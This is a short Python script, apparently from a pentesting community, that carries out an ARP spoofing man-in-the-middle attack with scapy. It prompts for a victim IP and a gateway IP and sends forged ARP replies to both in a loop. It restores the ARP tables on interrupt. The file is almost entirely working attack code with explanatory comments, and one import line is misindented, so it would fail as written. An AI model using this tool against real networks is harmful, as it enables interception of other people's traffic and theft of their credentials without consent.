#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sat Nov 19 00:27:30 2022

@author: dr404 (Myanmar Pentester Community)
"""


target_ip = input("target IP : ")
gateway_ip = input("GateWay IP : ")

import scapy.all as scapy
from termcolor import colored
 import time
import sys

def yellow(string,color='yellow'):
    return colored(string,color)


def red(string,color='red'):
    return colored(string,color)

def get_mac(ip):
    
    #  Creating ARP request to broadcast    
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Creating Final Packet to Broad Cast    
    arp_request_broadcast = broadcast/arp_request
    
    # Sending Request(broadcast) and caputer request 
    # The request contain two list (asnwer, and unansewer)
    
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]    
    
    return answered_list[0][1].hwsrc
    
    
   

def spoof(target_ip, spoof_ip):
    
    target_mac = get_mac(target_ip)
    
    #op=1 mean arp request (who-has) and op=2 is respond (is-at)
    
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    scapy.send(packet,verbose=False)
    
    
    
def restore(destination_ip, source_ip):  # To restore and function normal in victim computer
    
    destination_mac = get_mac(destination_ip)
    
    # ARP default set our own mac address as hwsrc, so we need to set hwsrc= manaually with router ip
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac )
    scapy.send(packet, count=4, verbose=False)
  
    
def main():
    
    # Without while loop, only one packet is send . so we need to use while loop to stay as man in the middle.
    
     
    sent_packet_count = 0
    
    try:
        while True:
            spoof(target_ip,gateway_ip)
            spoof(gateway_ip,target_ip)
            
            sent_packet_count = sent_packet_count + 2
            
            # "\r" always this string always start of the line. so only sent_packet_count change
            print("\r[+] Packet sent : "+ yellow(str(sent_packet_count)),end=" ")
            
            #Without sys.stdout, we cannot see any output in terminal
            sys.stdout.flush()
            
            time.sleep(2)
    
    except KeyboardInterrupt:
        print(red("\n\n[+] Detected CTRL + C ......Resetting ARP table.....Please Wait. \n"))
        restore(target_ip,gateway_ip) 
        restore(gateway_ip,target_ip)
        
       
    
    
if __name__=='__main__':
    main()
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    


